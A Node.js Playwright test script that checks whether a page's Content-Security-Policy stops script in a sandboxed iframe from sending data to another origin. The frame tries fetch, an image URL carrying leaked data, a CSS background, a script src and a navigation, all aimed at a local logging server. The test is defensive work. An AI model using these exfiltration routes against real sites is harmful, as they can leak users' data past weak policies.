// Does modules.html's CSP (connect-src 'none' only) stop an engine in <iframe sandbox="allow-scripts"> reaching
// another origin? Server B logs every request it receives.
import http from "http";
import { readFileSync } from "fs";
import { chromium } from "/home/user/Taxila/node_modules/playwright/index.mjs";
const csp = readFileSync("/home/user/Taxila/modules.html", "utf8").match(/content="([^"]*connect-src[^"]*)"/)[1];
const hits = [];
const b = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, { "content-type": "image/gif" }); res.end(); });
await new Promise((r) => b.listen(0, "127.0.0.1", r));
const B = `http://127.0.0.1:${b.address().port}`;
const frameHtml = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${csp}"><script>
  fetch("${B}/fetch").catch(()=>{});
  new Image().src = "${B}/img?leak=childdata";
  const s = document.createElement("style"); s.textContent = "body{background:url(${B}/css)}"; document.head.appendChild(s);
  const sc = document.createElement("script"); sc.src = "${B}/script.js"; document.head.appendChild(sc);
  setTimeout(() => { location.href = "${B}/navigate?leak=1"; }, 300);
</script>`;
const a = http.createServer((req, res) => {
  if (req.url.startsWith("/frame")) { res.writeHead(200, { "content-type": "text/html" }); return res.end(frameHtml); }
  res.writeHead(200, { "content-type": "text/html" }); res.end(`<iframe sandbox="allow-scripts" src="/frame"></iframe>`);
});
await new Promise((r) => a.listen(0, "127.0.0.1", r));
const browser = await chromium.launch({ executablePath: "/opt/pw-browsers/chromium" });
const page = await browser.newPage();
await page.goto(`http://127.0.0.1:${a.address().port}/`);
await page.waitForTimeout(1500);
console.log("CSP under test:", csp);
console.log("requests that reached the other origin:", hits);
await browser.close(); a.close(); b.close();
